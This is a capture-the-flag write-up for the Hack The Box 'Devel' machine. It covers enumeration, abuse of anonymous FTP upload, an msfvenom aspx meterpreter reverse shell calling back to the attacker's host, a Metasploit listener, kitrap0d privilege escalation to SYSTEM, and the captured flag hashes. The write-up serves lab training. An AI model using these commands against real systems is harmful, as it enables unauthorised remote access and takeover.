# HTB - Devel

## Enumeration

#### Nmap

Using the following command:

```
nmap -sC -sV -p- -vv --min-rate 10000 10.10.10.5
```

We receive the following output:

![[Pasted image 20250113025557.png]]

#### FTP

From the Nmap scan we see that anonymous ftp access is allowed. So we will enter ftp using the following command:

```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:randomsensei): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

Looking at the directories within the FTP server, we see that it looks like the web directories of a Windows server (such as the one on the HTTP port).

```
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

Now we will check if we can use `put` to add a script into the directory:

```
ftp> put test
local: test remote: test
229 Entering Extended Passive Mode (|||49167|)
125 Data connection already open; Transfer starting.
     0        0.00 KiB/s 
226 Transfer complete.
ftp> ls
229 Entering Extended Passive Mode (|||49168|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
01-12-25  06:13PM                    0 test
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

Here we see that we can do it, but rather than finding and exploit online or creating a new exploit ourselves, we know that we can place a `.aspx` script that will run meterpreter which will help in the post-exploitation phase.

## Exploit

To obtain shell, we will make use of msfvenom in the following command:

```
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.16.16 LPORT=4444
```

Now we have the shell file, we will now place this in the ftp server by doing the following:

```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:randomsensei): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put devel.aspx
local: devel.aspx remote: devel.aspx
229 Entering Extended Passive Mode (|||49238|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************************************************|  2926       48.95 MiB/s    --:-- ETA
226 Transfer complete.
2926 bytes sent in 00:00 (50.12 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49239|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
01-13-25  04:59PM                 2926 devel.aspx
03-17-17  04:37PM                  689 iisstart.htm
01-12-25  06:13PM                    0 test
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

Now we will head into msfconsole and run the listener handler to capture the reverse shell.
We will run the following module:

```
msfconsole
use exploit/multi/handler
set LHOST 10.10.16.16
set payload windows/meterpreter/reverse_tcp
exploit
```

Now we will head to the website and to the devel.aspx directory on `http://10.10.10.5/devel.aspx`.
Now we receive the connection in our metasploit handler.

```
[*] Started reverse TCP handler on 10.10.16.16:4444 
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.16:4444 -> 10.10.10.5:49159) at 2025-01-13 12:10:58 +1100

meterpreter > ls
Listing: c:\windows\system32\inetsrv
```

Now that we have access into the windows system as the user:

```
getuid
Server username: IIS APPPOOL\Web
```

Checking the files on the system, at the Users directory we see the babis and Administrator directories, however, with our current privileges we cannot access those directories. 

## Privilege Escalation

Now we need to attempt to escalate privileges, due to the fact that we are using a meterpreter session, we are able to background the session and run post exploitation payloads to attempt the escalate our privileges. To do so we will use the `local_exploit_suggester` exploit.

```
bg
use post/multi/recon/local_exploit_suggester
set SESSION 1
exploit
```

![[Pasted image 20250113122112.png]]

From the output we see many exploits that say that they may work. We will go through all of the exploits to see if any actually are able to escalate our privileges. Eventually we find a module that is actually able to escalate privileges because it shows a new meterpreter shell:

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST 10.10.16.16
exploit
[*] Started reverse TCP handler on 10.10.16.16:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2452 launched.
[*] Reflectively injecting the DLL into 2452...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.16.16:4444 -> 10.10.10.5:49161) at 2025-01-13 12:24:49 +1100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

So using the `ms10_015_kitrap0d` module we were able to escalate our privileges. 
Now we can head to the babis Desktop at the `C:\Users\babis\Desktop`. There we see the user.txt file:

```
cd C:\Users\babis\Desktop
cat user.txt
939f318c300aa25a6c1b55def5f6ca3d
```

Now we can head to the Administrator's Desktop at the `C:\Users\Administrator\Desktop`. There we see the root.txt file:

```
cd C:\Users\Administrator\Desktop
cat root.txt
26a79867895cbac3446088e6ad8ad094
```